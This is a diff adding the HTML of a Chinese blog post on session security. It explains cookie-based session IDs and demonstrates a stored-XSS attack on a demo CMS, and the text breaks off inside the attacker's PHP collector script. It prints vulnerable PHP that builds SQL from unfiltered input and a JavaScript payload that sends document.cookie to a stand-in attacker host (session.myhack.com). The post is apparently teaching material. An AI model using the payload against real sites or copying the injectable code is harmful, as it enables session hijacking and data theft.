@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="G1fh5LdQwTFHcGovLLQNlLyBut-RA-Z4tKs01Ml4ejA">
+  <meta name="baidu-site-verification" content="code-jxFFqRu4w9">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.whyun.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="介绍session的基本原理和安全性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="session的安全性">
+<meta property="og:url" content="https://blog.whyun.com/posts/session/">
+<meta property="og:site_name" content="白一梓的个人博客">
+<meta property="og:description" content="介绍session的基本原理和安全性">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png">
+<meta property="og:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/publish.png">
+<meta property="og:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/show_cookie.jpg">
+<meta property="og:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/alert_cookie.jpg">
+<meta property="og:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/cross_request.jpg">
+<meta property="og:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/hack_process.png">
+<meta property="article:published_time" content="2014-05-25T00:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-19T07:15:30.549Z">
+<meta property="article:author" content="yunnysunny">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png">
+
+
+<link rel="canonical" href="https://blog.whyun.com/posts/session/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.whyun.com/posts/session/","path":"posts/session/","title":"session的安全性"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>session的安全性 | 白一梓的个人博客</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?628c040f31bc950845419d51d5cbebeb"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="白一梓的个人博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">白一梓的个人博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E5%8E%9F%E7%90%86"><span class="nav-text">session原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E7%A4%BA%E4%BE%8B"><span class="nav-text">入侵示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%98%B2%E8%8C%83"><span class="nav-text">3.防范</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yunnysunny</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yunnysunny" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yunnysunny" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/1261004702" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;1261004702" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      推广链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://upyun.com/" title="http:&#x2F;&#x2F;upyun.com" rel="noopener" target="_blank">又拍云</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/yunnysunny" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.whyun.com/posts/session/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yunnysunny">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白一梓的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          session的安全性
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2014-05-25 00:00:00" itemprop="dateCreated datePublished" datetime="2014-05-25T00:00:00+00:00">2014-05-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-19 07:15:30" itemprop="dateModified" datetime="2022-01-19T07:15:30+00:00">2022-01-19</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+            <div class="post-description">介绍session的基本原理和安全性</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="session原理"><a href="#session原理" class="headerlink" title="session原理"></a>session原理</h2><p>提到session，大家肯定会联想到登录，登录成功后记录登录状态，同时标记当前登录用户是谁。功能大体上就是这个样子，但是今天要讲的不是功能，而是实现。通过探讨session的实现方式来发掘一些可能你之前不知道的有趣的事情。<br>为了记录session，在客户端和服务器端都要保存数据，客户端记录一个标记，服务器端不但存储了这个标记同时还存储了这个标记映射的数据。好吧，还是说点白话吧，在客户端记录的其实是一个sessionid，在服务器端记录的是一个key-value形式的数据结构，这里的key肯定是指sessionid了，value就代表session的详细内容。用户在做http请求的时候，总是会把sessionid传递给服务器，然后服务器根据这个sessionid来查询session的内容（也就是上面说到的value）。<br>现在我们重点关注一下sessionid，他是今天问题的关键所在。sessionid在客户端（http的客户端一般就是指浏览器了）是存储在cookie中，当然也有例外（书本上肯定会提到也有保存在url中的，我做程序员这么多年也没有见过这种方式，这难道就是现实和实际的差距吗，好残酷）。<br>我们通过一个例子来阐述一下这个sessionid在session处理时的作用。首先假定这么一个场景，我们有一个cms（content management system，内容管理系统），这个应用有一个后台，用户必须登录才能进入后台进行文章发表等操作。首先是登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的：<code>set-cookie:PHPSESSID=xxxxxxx</code>,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png" alt="登录时序图"><br><strong>图1.1 登录时序图</strong><br>接着用户登录后台进行发表文章操作，登录用户填写文章的标题、内容，然后点击发送。这时候浏览器会生成一条到服务器的http请求，注意这个请求的头部会将存储sessionid的cookie内容发送过去，也就是说请求的http头部信息中应该会有这么一段数据：<code>cookie:PHPSESSID=xxxxxxx;other_cookie_name=yyyyyy</code>；服务器接收到这个http请求之后，解析到cookie存在，且cookie中存在PHPSESSID这个cookie名字，然后就将PHPSESSID的值（也就是sessionid的值）取出来，根据这个PHPSESSID查询服务器上有没有对应的session内容，如果有则将其对应的值取出来进行反序列序列化（也就是将其转成编程语言中的一个数据结果，比如在php中会得到一个<code>$_SESSION</code>数组，在j2ee中会得到类型为<code>javax.servlet.http.HttpSession</code>），方便在程序中进行读取，最终服务器认定session中储存的值存在，并且从反序列化得到的对象中读取到了用户ID属性，然后就往cms数据库的文章表中插入了一条数据，最终返回http响应，告诉浏览器操作成功了。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/publish.png" alt="发表文章时序图"><br><strong>图1.2 发表文章时序图</strong></p>
+<h2 id="入侵示例"><a href="#入侵示例" class="headerlink" title="入侵示例"></a>入侵示例</h2><p>关于cookie的一些属性，可以参考我的另一篇博文<a target="_blank" rel="noopener" href="http://blog.csdn.net/yunnysunny/article/details/7748106" title="关于cookie的一些事">关于cookie的一些事</a>，里面会提到一个httponly的属性，也就是是否禁止js读取cookie。不幸的是很多常见的服务器（比如apache和tomcat）在生成这个存储sessionid的cookie的时候，没有设置httponly这个属性，也就是说js是可以将这个sessionid读取出来的。<br>js读取到sessionid，这会有问题吗？如果没有问题，我就不在这里啰嗦了。你网站上的运行的js代码并不一定是你写的，比如说一般网站都有一个发表文章或者说发帖的功能，如果别有用心的人在发表的时候填写了html代码（这些html一般是超链接或者图片），但是你的后台又没有将其过滤掉，发表出来的文章，被其他人点击了其中恶意链接时，就出事了。这也就是我们常说的XSS。 </p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'尚未登录'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../globaldb.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'标题为空'</span><span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> end<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'内容为空'</span><span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> end<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'insert into article(title,content,uid,create_time) values("'</span><span class="token operator">.</span><span class="token variable">$title</span><span class="token operator">.</span><span class="token string single-quoted-string">'","'</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">'",'</span><span class="token operator">.</span><span class="token variable">$uid</span><span class="token operator">.</span><span class="token string single-quoted-string">',now())'</span><span class="token punctuation">;</span>
+        <span class="token variable">$rv</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">dbExecute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'插入失败'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'数据库操作失败'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+end<span class="token punctuation">:</span>
+<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>代码2.1 添加文章的后台代码</strong><br>这里给出了一段不靠谱代码，之所以这么说是由于对于提交的内容没有做过滤，比如说<code>content</code>表单域的内容。现在假设有这么两个网站，一个你自己的CMS网站，域名<code>mycms.whyun.com</code>,一个黑客用的网站，域名<code>session.myhack.com</code>。你可以通过配置hosts来模拟这两个网站，说到这里可还是推荐一下我之前做过的<a target="_blank" rel="noopener" href="http://git.oschina.net/yunnysunny/addhost" title="addhost">addhost</a>工具，可以自动生成hosts和vhost配置。代码2.1正是mycms网站的代码。<br>登录mycms后在后台添加一篇文章，文章内容为：</p>
+<pre><code>&lt;a href=\&quot;#\&quot; onclick=\&#39;javascript:alert(document.cookie);return false;\&#39;&gt;点击我，有惊喜！&lt;/a&gt;
+</code></pre>
+<p><strong>代码2.2 alert cookie</strong><br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/show_cookie.jpg" alt="显示cookie的html"><br><strong>图2.1 显示cookie的html</strong></p>
+<p>打开刚才生成的文章链接，然后点击<code>点击我，有惊喜！</code>,会显示当前域下的所有cookie。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/alert_cookie.jpg" alt="coookie被alert出来"><br><strong>图2.2 cookie被alert出来</strong></p>
+<p>当然要想做到攻击的目的仅仅做这些是不够的，下面将这个链接的内容做的丰富多彩些。</p>
+<pre><code>&lt;a href=\&quot;#\&quot; onclick=\&#39;javascript:var link = this; var head = document.getElementsByTagName(\&quot;head\&quot;)[0]; var js = document.createElement(\&quot;script\&quot;); js.src = \&quot;http://session.myhack.com/httphack.php?cook=\&quot;+encodeURIComponent(document.cookie); js.onload = js.onreadystatechange = function()&#123; if (!this.readyState || this.readyState == \&quot;loaded\&quot; || this.readyState == \&quot;complete\&quot;) &#123;head.removeChild(js);  alert(\&quot;over\&quot;); &#125; &#125;; head.appendChild(js);return false;\&#39;&gt;点击我，有惊喜2！&lt;/a&gt;
+</code></pre>
+<p><strong>代码2.3 跨站请求</strong><br>这里为了将代码嵌入html，得将其写作一行，其简洁模式为：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">   <span class="token keyword">var</span> link <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+<span class="token keyword">var</span> js <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+js<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://session.myhack.com/httphack.php?cook="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+js<span class="token punctuation">.</span>onload <span class="token operator">=</span> js<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">"loaded"</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">"complete"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+		head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'开始跳转真正的地址'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>link<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> 
+head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>代码2.4 跨站请求简洁版</strong><br>为了真正的体现他是超链接还是跳转到一个地址为妙，所以在简洁班中脚本加载结束后做了跳转，但是为了演示方便，我们在代码2.3中没有这么做。<br>现在再点击链接<code>点击我，有惊喜！</code>，查看一下一下网络请求，会发现一个到session.myhack.com/httphack.php地址的请求，返回数据为<code>var data = &#123;&quot;code&quot;:0&#125;;</code>。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/cross_request.jpg" alt="跨站请求"><br><strong>图2.3 跨站请求</strong></p>
+<p>接着看看httphack.php干了啥：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+   <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+   <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:application/javascript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function-definition function">getRealIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+   <span class="token punctuation">&#123;</span>
+	<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>
+	<span class="token variable">$ipname</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+		<span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">,</span>
+		<span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">,</span>
+		<span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">,</span>
+		<span class="token string single-quoted-string">'HTTP_X_FORWARDED'</span><span class="token punctuation">,</span>
+		<span class="token string single-quoted-string">'HTTP_X_CLUSTER_CLIENT_IP'</span><span class="token punctuation">,</span>
+		<span class="token string single-quoted-string">'HTTP_FORWARDED_FOR'</span><span class="token punctuation">,</span>
+		<span class="token string single-quoted-string">'HTTP_FORWARDED'</span>
+	<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ipname</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			
